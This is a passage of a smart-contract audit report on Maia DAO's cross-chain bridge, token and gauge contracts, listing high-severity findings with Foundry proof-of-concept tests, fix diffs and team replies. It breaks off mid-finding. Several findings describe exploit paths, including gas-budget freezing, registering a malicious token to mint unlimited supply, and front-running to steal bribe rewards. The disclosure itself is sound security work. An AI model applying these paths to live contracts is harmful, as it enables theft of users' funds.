0xLightt (Maia) confirmed
0xLightt (Maia) commented:
We recognize the audit’s findings on Ulysses AMM. These will not be rectified due to the upcoming migration of this section to Balancer Stable Pools.

[H-21] Missing the unwrapping of native token inRootBridgeAgent.sweep()causes fees to be stuck
Submitted bypeakbolt, also found byVoyvoda,xuwinnie, andkodyvim
RootBridgeAgent.sweep()will fail as it tries to transferaccumulatedFeesusingSafeTransferLib.safeTransferETH()but fails to unwrap the fees by withdrawing fromwrappedNativeToken.
Impact
TheaccumulatedFeeswill be stuck inRootBridgeAgentwithout any functions to withdraw them.
Proof of Concept
Add the below test case toRootTest.t.sol:
function testPeakboltSweep() public {//Set uptestAddLocalTokenArbitrum();//Prepare databytes memory packedData;{Multicall2.Call[] memory calls = new Multicall2.Call[](1);//Mock actioncalls[0] = Multicall2.Call({target: 0x0000000000000000000000000000000000000000, callData: ""});//Output ParamsOutputParams memory outputParams = OutputParams(address(this), newAvaxAssetGlobalAddress, 150 ether, 0);//RLP Encode Calldata Call with no gas to bridge out and we top up.bytes memory data = abi.encode(calls, outputParams, ftmChainId);//Pack FuncIdpackedData = abi.encodePacked(bytes1(0x02), data);}address _user = address(this);//Get some gas.hevm.deal(_user, 1 ether);hevm.deal(address(ftmPort), 1 ether);//assure there is enough balance for mock actionhevm.prank(address(rootPort));ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(address(rootPort), 50 ether, rootChainId);hevm.prank(address(avaxPort));ERC20hTokenBranch(avaxMockAssethToken).mint(_user, 50 ether);//Mint Underlying Token.avaxMockAssetToken.mint(_user, 100 ether);//Prepare deposit infoDepositInput memory depositInput = DepositInput({hToken: address(avaxMockAssethToken),token: address(avaxMockAssetToken),amount: 150 ether,deposit: 100 ether,toChain: ftmChainId});console2.log("accumulatedFees (BEFORE) = %d", multicallBridgeAgent.accumulatedFees());//Call Deposit functionavaxMockAssetToken.approve(address(avaxPort), 100 ether);ERC20hTokenRoot(avaxMockAssethToken).approve(address(avaxPort), 50 ether);uint128 remoteExecutionGas = 4e9;uint128 depositedGas = 1e11;avaxMulticallBridgeAgent.callOutSignedAndBridge{value: depositedGas }(packedData, depositInput, remoteExecutionGas);console2.log("accumulatedFees (AFTER)  = %d", multicallBridgeAgent.accumulatedFees());console2.log("WETH Balance = %d ", multicallBridgeAgent.wrappedNativeToken().balanceOf(address(multicallBridgeAgent)));console2.log("ETH Balance = %d ", address(multicallBridgeAgent).balance);// sweep() will fail as it does not unwrap the WETH before the ETH transfermulticallBridgeAgent.sweep();}
Recommended Mitigation Steps
AddwrappedNativeToken.withdraw(_accumulatedFees);tosweep()before transferring.
0xBugsy (Maia) confirmed, but disagreed with severity
Trust (judge) commented:
Funds are permanently stuck; therefore, high severity is appropriate.
0xBugsy (Maia) commented:
We recognize the audit’s findings on Anycall. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-22] Multiple issues withretrySettlement()andretrieveDeposit()will cause loss of users’ bridging deposits
Submitted bypeakbolt, also found by Noro (1,2), zzebra83 (1,2),Evo, andEmmanuel
BothretrySettlement()andretrieveDeposit()are incorrectly implemented with the following 3 issues:
BothretrySettlement()andretrieveDeposit()are lacking a call towrappedNativeToken.deposit()to wrap the native token paid by users for gas. This causes a subsequent call to_depositGas()to fail atBranchBridgeAgent.sol#L929-L931. This is also inconsistent with the other functions likeretryDeposit(), which wraps the received native token for gas (seeBranchBridgeAgent.sol#L441-L447).retrySettlement()has a redundant increment fordepositNonceinBranchBridgeAgent.sol#L426, which will cause a differentdepositNoncevalue to be used for the subsequent call to_createGasDepositinBranchBridgeAgent.sol#L836.BothretrySettlement()andretrieveDeposit()are missing a fallback implementation, asBranchBridgeAgent.anyFallback()is not handling flag0x07(retrySettlement) and flag0x08(retrieveDeposit), as evident inBranchBridgeAgent.sol#L1227-L1307.
Impact
Due to these issues, bothretrySettlement()andretrieveDeposit()will cease to function properly. That will prevent users from re-trying the failed settlement and retrieving deposits, resulting in a loss of users’ deposits for bridging. In addition, the gas paid by a user that is not wrapped will also be stuck inBranchBridgeAgent, as there is no function to withdraw the native token.
Proof of Concept
Add the following test case toRootTest.t.sol. This shows the issues with the lack of native token wrapping:
functiontestPeakboltRetrySettlement()public{//Set uptestAddLocalTokenArbitrum();//Prepare databytesmemorypackedData;{Multicall2.Call[]memorycalls=newMulticall2.Call[](1);//Mock actioncalls[0] =Multicall2.Call({target:0x0000000000000000000000000000000000000000,callData:""});//Output ParamsOutputParamsmemoryoutputParams=OutputParams(address(this),newAvaxAssetGlobalAddress,150ether,0);//RLP Encode Calldata Call with no gas to bridge out and we top up.bytesmemorydata=abi.encode(calls,outputParams,ftmChainId);//Pack FuncIdpackedData=abi.encodePacked(bytes1(0x02),data);}address_user=address(this);//Get some gas.hevm.deal(_user,1ether);hevm.deal(address(ftmPort),1ether);//assure there is enough balance for mock actionhevm.prank(address(rootPort));ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(address(rootPort),50ether,rootChainId);hevm.prank(address(avaxPort));ERC20hTokenBranch(avaxMockAssethToken).mint(_user,50ether);//Mint Underlying Token.avaxMockAssetToken.mint(_user,100ether);//Prepare deposit infoDepositInputmemorydepositInput=DepositInput({hToken:address(avaxMockAssethToken),token:address(avaxMockAssetToken),amount:150ether,deposit:100ether,toChain:ftmChainId});console2.log("-------------  Creating a failed settlement ----------------");//Call Deposit functionavaxMockAssetToken.approve(address(avaxPort),100ether);ERC20hTokenRoot(avaxMockAssethToken).approve(address(avaxPort),50ether);//Set MockAnycall AnyFallback mode ONMockAnycall(local`AnyCall`Address).toggleFallback(1);//this is for branchBridgeAgent anyExecuteuint128remoteExecutionGas=4e9;//msg.value is total gas amount for both Root and Branch agentsavaxMulticallBridgeAgent.callOutSignedAndBridge{value:1e11}(packedData,depositInput,remoteExecutionGas);//Set MockAnycall AnyFallback mode OFFMockAnycall(local`AnyCall`Address).toggleFallback(0);//Perform anyFallback transaction back to root bridge agentMockAnycall(local`AnyCall`Address).testFallback();//check settlement statusuint32settlementNonce=multicallBridgeAgent.settlementNonce() -1;Settlementmemorysettlement=multicallBridgeAgent.getSettlementEntry(settlementNonce);console2.log("Status after fallback:",settlement.status==SettlementStatus.Failed?"Failed":"Success");require(settlement.status==SettlementStatus.Failed,"Settlement status should be failed.");console2.log("------------- retrying Settlement ----------------");//Get some gas.hevm.deal(_user,1ether);//Retry Settlementuint256depositedGas=7.9e9;uint128gasToBridgeOut=1.6e9;// This is expected to fail the gas paid by user is not wrapped and transferredavaxMulticallBridgeAgent.retrySettlement{value:depositedGas}(settlementNonce,gasToBridgeOut);settlement=multicallBridgeAgent.getSettlementEntry(settlementNonce);require(settlement.status==SettlementStatus.Success,"Settlement status should be success.");addressuserAccount=address(RootPort(rootPort).getUserAccount(_user));}
Recommended Mitigation Steps
AddwrappedNativeToken.deposit{value: msg.value}();to bothretrySettlement()andretrieveDeposit().Remove the increment fromdepositNonceinBranchBridgeAgent.sol#L426.Add fallback implementation for both flag0x07(retrySettlement) and flag0x08(retrieveDeposit).
0xBugsy (Maia) confirmed and commented:
Retrieve and Retry are not intended to be featured in a fallback. You should always be able to retry again and retrieve if you just want to clear your assets for redemption; although, the gas and increment will be addressed according to your suggestion.
0xLightt (Maia) commented:
Addressedhere.

[H-23] An attacker can redeposit gas afterforceRevert()to freeze all deposited gas budget ofRoot Bridge Agent
Submitted byxuwinnie
The callforceRevert()withdraws all of the deposited gas budget ofRoot Bridge Agentto ensure that the  failedAnyCallexecution will not be charged. However, ifforceRevert()took place during a call made byvirtual account, the gas can be replenished later manually. As a result, theAnyCallexecution will succeed, but all withdrawn gas will be frozen.
Proof of Concept
function anyExecute(bytes calldata data)externalvirtualrequiresExecutorreturns (bool success, bytes memory result){uint256 _initialGas = gasleft();uint24 fromChainId;UserFeeInfo memory _userFeeInfo;if (local`AnyCall`ExecutorAddress == msg.sender) {initialGas = _initialGas;(, uint256 _fromChainId) = _getContext();fromChainId = _fromChainId.toUint24();_userFeeInfo.depositedGas = _gasSwapIn(uint256(uint128(bytes16(data[data.length - PARAMS_GAS_IN:data.length - PARAMS_GAS_OUT]))), fromChainId).toUint128();_userFeeInfo.gasToBridgeOut = uint128(bytes16(data[data.length - PARAMS_GAS_OUT:data.length]));} else {fromChainId = localChainId;_userFeeInfo.depositedGas = uint128(bytes16(data[data.length - 32:data.length - 16]));_userFeeInfo.gasToBridgeOut = _userFeeInfo.depositedGas;}if (_userFeeInfo.depositedGas < _userFeeInfo.gasToBridgeOut) {_forceRevert();return (true, "Not enough gas to bridge out");}userFeeInfo = _userFeeInfo;// execution part............if (initialGas > 0) {_payExecutionGas(userFeeInfo.depositedGas, userFeeInfo.gasToBridgeOut, _initialGas, fromChainId);}}
To implement the attack, the attacker can callcallOutSignedon a branch chain to bypasslock. On the root chain, thevirtual accountmakes three external calls:
retryDepositatArbitrum Branch Bridge Agentwith an already executed nonce. The call willforceRevert()andinitialGaswill be non-zero since it has not been modified by reentering. As a result, all of the execution gas budget will be withdrawn.
function _forceRevert() internal {if (initialGas == 0) revert GasErrorOrRepeatedTx();IAnycallConfig anycallConfig = IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config());uint256 executionBudget = anycallConfig.executionBudget(address(this));// Withdraw all execution gas budget from anycall for tx to revert with "no enough budget"if (executionBudget > 0) try anycallConfig.withdraw(executionBudget) {} catch {}}
callOutatArbitrum Branch Bridge Agent. The call should succeed andinitialGasis deleted.
function _payExecutionGas(uint128 _depositedGas, uint128 _gasToBridgeOut, uint256 _initialGas, uint24 _fromChain) internal {delete(initialGas);delete(userFeeInfo);if (_fromChain == localChainId) return;
Directly deposit a small amount of gas atAnycall Config, to ensure the success of the transaction.
function deposit(address _account) external payable {executionBudget[_account] += msg.value;emit Deposit(_account, msg.value);}
Then, the original call proceeds and_payExecutionGaswill be skipped. The call will succeed with all withdrawn gas budgets permanently frozen. In current implementation, ETH can be sweeped to the DAO address, but this is another mistake, assweepshould transfer WETH instead.
Recommended Mitigation Steps
Add amsg.sendercheck in_forceRevertto ensure the local call will be directly reverted.
Assessed type
Reentrancy
0xBugsy (Maia) confirmed
peakbolt (warden) commented:
This is an interesting attack vector.However, the impact seems like a Medium, as the attack cost could be higher than the frozen execution gas budget, lowering the incentive for such an attack. That is because the attacker has to pay the tx cost and also deposit gas to theAnycallConfigfor the attack to succeed. And the execution gas budget inRootBridgeAgentis likely negligible, as it is intended to be replenished by the user.
xuwinnie (warden) commented:
Hey @peakbolt - Actually, it could DOS the entire cross chain message sending.“If the gas fee isn’t enough when you callanycall, the tx wouldn’t execute until you top up with enough gas fees. This status would be reflected in the api.”- according to theanycall V7documentation (RIP multichain).IfRootBridgeAgenthas zero budget, tx will not execute. But no user is incentivized to top it up manually. The system heavily relies on the pre-deposited gas.
To make it clearer, suppose when deploying, a team tops up 5 units of gas. A user’s tx cost 1 unit gas, then 1 unit gas is replenished. However, if the 5 units of gas is removed, the tx won’t execute at all.
0xBugsy (Maia) commented:
@xuwinnie - the system should execute tx as long asexecutionBudgetis>0. But you are correct - if this value reaches 0, the execution will be stopped until gas is topped up and this can be continuously depleted, which is completely undesired.
0xBugsy (Maia) commented:
We recognize the audit’s findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-24] A malicious user can set any contract as a localhTokenfor an underlying token since there is no access control for_addLocalToken
Submitted byxuwinnie
A malicious user can deliberately set an irrelevant (or even poisonous) localhTokenfor an underlying token, as anyone can directly access_addLocalTokenat the root chain without callingaddLocalTokenat the branch chain first.
Proof of Concept
function addLocalToken(address _underlyingAddress) external payable virtual {//Get Token Infostring memory name = ERC20(_underlyingAddress).name();string memory symbol = ERC20(_underlyingAddress).symbol();//Create TokenERC20hToken newToken = ITokenFactory(hTokenFactoryAddress).createToken(name, symbol);//Encode Databytes memory data = abi.encode(_underlyingAddress, newToken, name, symbol);//Pack FuncIdbytes memory packedData = abi.encodePacked(bytes1(0x02), data);//Send Cross-Chain request (System Response/Request)IBridgeAgent(localBridgeAgentAddress).performCallOut{value: msg.value}(msg.sender, packedData, 0, 0);}
The intended method to add a new local token for an underlying is by calling the functionaddLocalTokenat the branch chain. However, it appears that the last line of code,IBridgeAgent(localBridgeAgentAddress).performCallOut{value: msg.value}(msg.sender, packedData, 0, 0);usesperformCallOutinstead ofperformSystemCallOut. This means that users can directlycallOutat the branch bridge agent with_params = abi.encodePacked(bytes1(0x02), abi.encode(_underlyingAddress, anyContract, name, symbol))to invoke_addLocalTokenat the root chain without callingaddLocalTokenfirst. As a result, they may set an arbitrary contract as the local token. It’s worth noting that the impact is irreversible, as there is no mechanism to modify or delete local tokens, meaning that the underlying token can never be properly bridged in the future.
The branch hToken is called by functionbridgeInwhenredeemDepositorclearToken:
function bridgeIn(address _recipient, address _localAddress, uint256 _amount)externalvirtualrequiresBridgeAgent{ERC20hTokenBranch(_localAddress).mint(_recipient, _amount);}
Below are several potential exploitation methods:
If a regular ERC20 contract with admin minting permissions is set, the exploiter can mint an unlimited amount of local tokens for themselves. By bridging them, they can receive an arbitrary amount of global tokens at the root chain.If an unrelated contract with an emptymintfunction is set, the underlying asset would be unable to be bridged in from the root chain, and users who attempt to do so could lose their assets.If a malicious contract is set, gas grieving is possible.This contract may serve as an intermediary for re-entrancy (I haven’t found a concrete way so far, but there is a potential risk).
Recommended Mitigation Steps
UseperformSystemCallOutandexecuteSystemRequestto send Cross-Chain requests for adding a local token.
Assessed type
Access Control
0xBugsy (Maia) confirmed and commented:
In fact, theperformSystemCalloutshould be used there and notperformCallout, since this demands passing execution through the router first.
0xLightt (Maia) commented:
Addressedhere.

[H-25]UlyssesTokenasset ID accounting error
Submitted by0xTheC0der, also found byKupiaSec,bin2chen,jasonxiale,zzzitron,Fulum,BPZ,minhquanym,lsaudit,Atree,BLOS,xuwinnie, andSpicyMeatball
Asset IDs in theUlyssesTokencontract are1-based, seeL49 in UlyssesToken.addAsset(…)andL55 in ERC4626MultiToken.constructor(…)of the parent contract.However, when removing an asset from theUlyssesTokencontract, the last added asset gets the0-basedID of the removed asset, seeL72 in UlyssesToken.removeAsset(…).
This leads to the following consequences:
Duplicate IDs when removing an asset.Example:We have assets with IDs1,2,3,4. Next, the asset with ID=2 is removed. Now, we have assets with IDs1,1,3because the last asset with ID=4 gets ID=2-1=1.The last asset cannot be removed after removing the first asset.Example:Once the first asset with ID=1 is removed, the last asset gets ID=0 instead of ID=1. When trying to remove the last assetL62 in UlyssesToken.removeAsset(…)willrevertdue to underflow.The last asset can be added a second time after removing the first asset.Example:Once the first asset with ID=1 is removed, the last asset gets ID=0 instead of ID=1. When trying to add the last asset againL45 in UlyssesToken.addAsset(…)willnot revertsince ID=0 indicates that the asset wasn’t added yet. Therefore, the underlying vault can contain the same token twice withdifferentweights.
In conclusion, the asset accounting of theUlyssesTokencontract is broken after removing an asset (especially the first one). This was also highlighted as a special area of concern in the audit details:ulysses AMM and token accounting.
Proof of Concept
The above issues are demonstrated by the new test casestest_UlyssesTokenAddAssetTwiceandtest_UlyssesTokenRemoveAssetFail. Just apply thediffbelow and run the tests withforge test --match-test test_UlyssesToken:
diff --git a/test/ulysses-amm/UlyssesTokenTest.t.sol b/test/ulysses-amm/UlyssesTokenTest.t.solindex bdb4a7d..dcf6d45 100644--- a/test/ulysses-amm/UlyssesTokenTest.t.sol+++ b/test/ulysses-amm/UlyssesTokenTest.t.sol@@ -3,6 +3,7 @@ pragma solidity >=0.8.0 <0.9.0;import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";import {UlyssesToken} from "@ulysses-amm/UlyssesToken.sol";+import {IUlyssesToken} from "@ulysses-amm/interfaces/IUlyssesToken.sol";import {UlyssesTokenHandler} from "@test/test-utils/invariant/handlers/UlyssesTokenHandler.t.sol";@@ -29,4 +30,28 @@ contract InvariantUlyssesToken is UlyssesTokenHandler {_vaultMayBeEmpty = true;_unlimitedAmount = false;}++    function test_UlyssesTokenRemoveAssetFail() public  {+        UlyssesToken token = UlyssesToken(_vault_);++        // remove first asset with ID=1+        token.removeAsset(_underlyings_[0]);+        // due to accounting error, last asset now has ID=0 instead of ID=1++        // remove last asset --> underflow error due to ID=0+        token.removeAsset(_underlyings_[NUM_ASSETS - 1]);+    }++    function test_UlyssesTokenAddAssetTwice() public  {+        UlyssesToken token = UlyssesToken(_vault_);++        // remove first asset with ID=1+        token.removeAsset(_underlyings_[0]);+        // due to accounting error, last asset now has ID=0 instead of ID=1++        // add last asset again --> doesn't revert since it "officially" doesn't exist due to ID=1+        vm.expectRevert(IUlyssesToken.AssetAlreadyAdded.selector);+        token.addAsset(_underlyings_[NUM_ASSETS - 1], 1);+    }+}
We can see that adding the last asset again doesnot revertbut trying to remove it stillfails:
Encountered 2 failing tests in test/ulysses-amm/UlyssesTokenTest.t.sol:InvariantUlyssesToken[FAIL. Reason: Call did not revert as expected] test_UlyssesTokenAddAssetTwice() (gas: 169088)[FAIL. Reason: Arithmetic over/underflow] test_UlyssesTokenRemoveAssetFail() (gas: 137184)
Tools Used
VS Code, Foundry and MS Excel
Recommended Mitigation Steps
Fortunately, all of the above issues can be easily fixed by using an1-basedasset ID inL72 of UlyssesToken.removeAsset(…):
diff --git a/src/ulysses-amm/UlyssesToken.sol b/src/ulysses-amm/UlyssesToken.solindex 552a125..0937e9f 100644--- a/src/ulysses-amm/UlyssesToken.sol+++ b/src/ulysses-amm/UlyssesToken.sol@@ -69,7 +69,7 @@ contract UlyssesToken is ERC4626MultiToken, Ownable, IUlyssesToken {address lastAsset = assets[newAssetsLength];-        assetId[lastAsset] = assetIndex;+        assetId[lastAsset] = assetIndex + 1;assets[assetIndex] = lastAsset;weights[assetIndex] = weights[newAssetsLength];
After applying the recommended fix, both new test cases pass:
[PASS] test_UlyssesTokenAddAssetTwice() (gas: 122911)[PASS] test_UlyssesTokenRemoveAssetFail() (gas: 134916)
Assessed type
Under/Overflow
Trust (judge) increased severity to High
0xLightt (Maia) confirmed and commented:
We recognize the audit’s findings on Ulysses Token. These will not be rectified due to the upcoming migration of this section to Balancer Stable Pools Wrapper.

[H-26] Accessing the incorrect offset to get the nonce when a flag is 0x06 inRootBridgeAgent::anyExecute()will lead to marked as executed incorrect nonces and could potentially cause a DoS
Submitted by0xStalin
Not reading the correct offset where thenonceis located can lead to the set being executed the incorrect nonce, which will cause unexpected behavior and potentially a DoS when attempting to execute anoncethat was incorrectly marked as already executed.
Proof of Concept
The structure of the data is encoded as detailed in theIRootBridgeAgentcontract:
-        |Flag|DepositInfo|TokenInfo|DATA|GasInfo|-        |1byte|4-25bytes|3+ (105or128) *nbytes|   ---	 |32bytes|-        |_______________________________|____________________________|____________________________________|__________|_____________|-        |callOutSignedMultiple=0x6|   20b+ 1b(n) + 4b(nonce)  |      32b+ 32b+ 32b+ 32b+ 3b|   ---	 |  16b+ 16b|
The actual encoding of the data happens on theBranchBridgeAgentcontract,on these lines.
Based on the data structure, we can decode and determine which offset is located on what data:
data[0]=> flagdata[1:21]=> an addressdata[21]=> hTokens.lengthdata[22:26]=> The 4 bytes of the nonce
So, when flag is0x06, the nonce is located at the offsetdata[22:26], which indicates that the current offset that is been accessed is wrong(data[PARAMS_START_SIGNED:25]===data[21:]).
Recommended Mitigation Steps
Make sure to read thenoncefrom the correct offset, based on the data structure as explained in theIRootBridgeAgentcontract.
Forflag 0x06, read the offset as follows. Either of the two options are correct:
nonceis located at:data[22:26]
nonce=uint32(bytes4(data[PARAMS_START_SIGNED+PARAMS_START:26]));nonce=uint32(bytes4(data[22:26]));
Assessed type
en/de-code
Trust (judge) increased severity to High
0xBugsy (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-27] Lack of a return value handing inArbitrumBranchBridgeAgent._performCall()could cause users’ deposit to be locked in contract
Submitted bypeakbolt, also found by Emmanuel (1,2)
InArbitrumBranchBridgeAgent, the_performCall()is overridden to directly callRootBridgeAgent.anyExecute()instead of performing anAnyCallcross-chain transaction, asRootBridgeAgentis also in Arbitrum. However, unlikeAnyCall,ArbitrumBranchBridgeAgent._performCall()is missing the handling of a return value foranyExecute().
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchBridgeAgent.sol#L143
function_performCall(bytesmemory_callData)internaloverride{IRootBridgeAgent(rootBridgeAgentAddress).anyExecute(_callData);}
That is undesirable, asRootBridgeAgent.anyExecute()has a try/catch that prevents the revert from bubbling up. Instead, it expectsArbitrumBranchBridgeAgent._performCall()to revert whensuccess == false, which is currently missing.
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L1068-L1074
tryRootBridgeAgentExecutor(bridgeAgentExecutorAddress).executeSignedWithDeposit(address(userAccount),localRouterAddress,data,fromChainId)returns(bool,bytesmemoryres) {(success,result) = (true,res);}catch(bytesmemoryreason) {result=reason;}
Impact
Without handling the scenario whenRootBridgeAgent.anyExecute()returns false,ArbitrumBranchBridgeAgent._performCall()will continue the execution, even for failed calls and not revert due to the try/catch inRootBridgeAgent.anyExecute().
In the worst case, users could lose their bridged deposit when they useArbitrumBranchBridgeAgent.callOutSignedAndBridge()to interact with dApps and encountered failed calls.
When failed calls to dApps occur,ArbitrumBranchBridgeAgent.callOutSignedAndBridge()is expected to revert the entire transaction and reverse the bridging of the deposit. However, due to the issue with_performCall(), the bridged deposit will not be reverted, thus locking up user funds in the contract. Furthermore,RootBridgeAgent.anyExecute()will mark the deposit transaction as executed inexecutionHistory[], preventing anyretryDeposit()orretrieveDeposit()attempts to recover the funds.
Proof of Concept
Add the followingMockContractand test case toArbitrumBranchTest.t.soland run the test case:
contractMockContractisTest{functiontest()external{require(false);}}functiontestPeakboltArbCallOutWithDeposit()public{//Set uptestAddLocalTokenArbitrum();// deploy mock contract to call using multicallMockContractmockContract=newMockContract();//Prepare dataaddressoutputToken;uint256amountOut;uint256depositOut;bytesmemorypackedData;{outputToken=newArbitrumAssetGlobalAddress;amountOut=100ether;depositOut=50ether;Multicall2.Call[]memorycalls=newMulticall2.Call[](1);//prepare for a call to MockContract.test(), which will revertcalls[0] =Multicall2.Call({target:address(mockContract),callData:abi.encodeWithSignature("test()")});//Output ParamsOutputParamsmemoryoutputParams=OutputParams(address(this),outputToken,amountOut,depositOut);//toChainuint24toChain=rootChainId;//RLP Encode Calldatabytesmemorydata=abi.encode(calls,outputParams,toChain);//Pack FuncIdpackedData=abi.encodePacked(bytes1(0x02),data);}//Get some gas.hevm.deal(address(this),1ether);//Mint Underlying Token.arbitrumNativeToken.mint(address(this),100ether);//Approve spend by routerarbitrumNativeToken.approve(address(localPortAddress),100ether);//Prepare deposit infoDepositInputmemorydepositInput=DepositInput({hToken:address(newArbitrumAssetGlobalAddress),token:address(arbitrumNativeToken),amount:100ether,deposit:100ether,toChain:rootChainId});//Mock messaging layer feeshevm.mockCall(address(localAnyCongfig),abi.encodeWithSignature("calcSrcFees(address,uint256,uint256)",address(0),0,100),abi.encode(0));console2.log("Initial User Balance: %d",arbitrumNativeToken.balanceOf(address(this)));//Call Deposit functionarbitrumMulticallBridgeAgent.callOutSignedAndBridge{value:1ether}(packedData,depositInput,0.5ether);// This shows that deposit entry is successfully createdtestCreateDepositSingle(arbitrumMulticallBridgeAgent,uint32(1),address(this),address(newArbitrumAssetGlobalAddress),address(arbitrumNativeToken),100ether,100ether,1ether,0.5ether);// The following shows that the user deposited to the LocalPort, but it is not deposited/bridged to the user accountconsole2.log("LocalPort Balance (expected):",uint256(50ether));console2.log("LocalPort Balance (actual):",MockERC20(arbitrumNativeToken).balanceOf(address(localPortAddress)));//require(MockERC20(arbitrumNativeToken).balanceOf(address(localPortAddress)) == 50 ether, "LocalPort should have 50 tokens");console2.log("User Balance: (expected)",uint256(50ether));console2.log("User Balance: (actual)",MockERC20(arbitrumNativeToken).balanceOf(address(this)));//require(MockERC20(arbitrumNativeToken).balanceOf(address(this)) == 50 ether, "User should have 50 tokens");console2.log("User Global Balance: (expected)",uint256(50ether));console2.log("User Global Balance: (actual)",MockERC20(newArbitrumAssetGlobalAddress).balanceOf(address(this)));//require(MockERC20(newArbitrumAssetGlobalAddress).balanceOf(address(this)) == 50 ether, "User should have 50 global tokens");// retryDeposit() will fail as well as the transaction is marked executed in executionHistoryuint32depositNonce=arbitrumMulticallBridgeAgent.depositNonce() -1;hevm.deal(address(this),1ether);//hevm.expectRevert(abi.encodeWithSignature("GasErrorOrRepeatedTx()"));arbitrumMulticallBridgeAgent.retryDeposit{value:1ether}(true,depositNonce,"",0.5ether,rootChainId);}
Recommended Mitigation Steps
Handle the return value ofanyExecute()in_performCall()and revert onsuccess == false.
0xBugsy (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-28] Removing aBribeFlywheelfrom a Gauge does not remove the reward asset from the rewards depo, making it impossible to add a new Flywheel with the same reward token
Submitted byABA, also found bygiovannidisienaandAudinarey
Removing a bribe Flywheel (FlywheelCore) from a Gauge (viaBaseV2Gauge::removeBribeFlywheel) does not remove the reward asset (callMultiRewardsDepot::removeAsset) from the rewards depo (BaseV2Gauge::multiRewardsDepot), making it impossible to add a new Flywheel (by callingBaseV2Gauge::addBribeFlywheel) with the same reward token (becauseMultiRewardsDepot::addAssetreverts as the assets already exist).
The impact is limiting protocol functionality in unwanted ways, possibly impacting gains in the long run. Example: due to incentives lost by not having a specific token bribe reward.
Proof of Concept
Observation: aBribeFlywheelis aFlywheelCorewith aFlywheelBribeRewardsset as theFlywheelRewards, typically created using theBribesFactory::createBribeFlywheel.
Scenario and execution flow
A project decides to add an initialBribeFlywheelto the recently deployedUniswapV3Gaugecontract.This is done by callingUniswapV3GaugeFactory::BaseV2GaugeFactory::addBribeToGauge.The execution further goes toBaseV2Gauge::addGaugetoFlywheelwherethe bribe flywheel reward token is addedto the multi reward depo.A project decides, for whatever reason (a bug in the contract, an exploit, a decommission, a more profitable wheel that would use the same rewards token), that they want to replace the old flywheel with a new one.Removing this is done via callingUniswapV3GaugeFactory::BaseV2GaugeFactory::removeBribeFromGauge.The execution further goes toBaseV2Gauge::removeBribeFlywheel, where the flywheel is removed but the reward token assetis not removed from the multi reward depo. There is no call toMultiRewardsDepot::removeAsset:
functionremoveBribeFlywheel(FlywheelCorebribeFlywheel)externalonlyOwner{/// @dev Can only remove active flywheelsif(!isActive[bribeFlywheel])revertFlywheelNotActive();/// @dev This is permanent; can't be re-addeddeleteisActive[bribeFlywheel];emitRemoveBribeFlywheel(bribeFlywheel);}
After removal, when trying to add a new flywheel with the same rewards token, the execution fails withErrorAddingAssetsince theaddAssetcall reverts sincethe rewards token was not removedwith the previous call toBaseV2Gauge::removeBribeFlywheel.
Recommended Mitigation Steps
whenBaseV2Gauge::removeBribeFlywheelis called for a particular flywheel, also remove its corresponding reward depo token.
Example implementation:
diff --git a/src/gauges/BaseV2Gauge.sol b/src/gauges/BaseV2Gauge.solindex c2793a7..8ea6c1e 100644--- a/src/gauges/BaseV2Gauge.sol+++ b/src/gauges/BaseV2Gauge.sol@@ -148,6 +148,9 @@ abstract contract BaseV2Gauge is Ownable, IBaseV2Gauge {/// @dev This is permanent; can't be re-addeddelete isActive[bribeFlywheel];+        address flyWheelRewards = address(bribeFlywheel.flywheelRewards());+        multiRewardsDepot.removeAsset(flyWheelRewards);+emit RemoveBribeFlywheel(bribeFlywheel);}
Trust (judge) increased the severity to High
0xLightt (Maia) confirmed, but disagreed with severity and commented:
This happens due to not being able to remove strategies fromFlyWheelCoreand the immutability in bribes. In accruing bribes for gauges, there is only one general FlyWheel per token, so removing it from theRewardsDepotwould actually brick all rewards of the FlyWheel’s token.The goal with removing the flywheel from the gauge is to stop forcing the user to callaccrueand update therewardIndexfor that flywheel to save gas or remove an unwanted token. After removing this forced accrual, users can increase their voting balance, accrue and then decrease the voting balance without accruing again. So the balances to accrue rewards can’t be trusted and would lead to issues if we tried to reuse the same FlyWheel for the same strategy. One solution would be to add the option to remove the strategy from the flywheel, but could lead to un-accrued rewards being bricked.If there is a need to migrate the bribe system, there needs to be a migration of the gauge system as well. This is intended so that users can opt in into the migration, in turn, protecting them.I believe the best solution would be to leave it up to the user to choose the bribes they want to accrue. By default, all users could have all bribes set asoptOutfor all strategies andFlywheelBoosterwould always return 0 when queryingboostedBalanceOfand wouldn’t take the user’s balance into account inboostedTotalSupply. If the user decides tooptIninto a bribe for strategy (we would mimic a minting scenario), they would accrue with 0 balance, having their current balance added to the the strategy’sboostedTotalSupplyandboostedBalanceOf, which would return the allocatedgaugeWeightinstead of 0. The opposite is when a user tries tooptOutafter beingoptIn. There should be the option to give up rewards, actually bricking in them, but it would be useful in case there is an issue with the token; for example, reverts when transferring from therewardsDepot. The gauge would force the user to accrue rewards for alloptInbribes when changing it’s balance.
This way, we can completely remove governance around bribes, but would still keep the immutability of the bribes system intact.
0xLightt (Maia) commented:
Addressedhere.

[H-29] A malicious user can front-run Gauges’s calladdBribeFlywheelto steal bribe rewards
Submitted bysaid, also found bykutugu
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L46-L54
Impact
When the Gauge in the initial setup and flywheel is created and added to the gauge viaaddBribeFlywheel, a malicious user can front-run this to steal rewards. This could happen due to the un-initializedendCycleinside theFlywheelAcummulatedRewardscontract.
Proof of Concept
Consider this scenario :
Gauge is first created, then an admin deposit of 100 eth is sent to depot reward.FlyWheel is also created, usingFlywheelBribeRewardsinherent in theFlywheelAcummulatedRewards\implementation.A malicious attacker hasaddBribeFlywheelthat is about to be called by the owner and front-run it by callingincrementGauge(a huge amount of gauge token for this gauge).The calladdBribeFlywheelis executed.Now, a malicious user can triggeraccrueBribesand claim the reward.The bribe rewards are now stolen and a malicious user can immediately decrement their gauge from this contract.
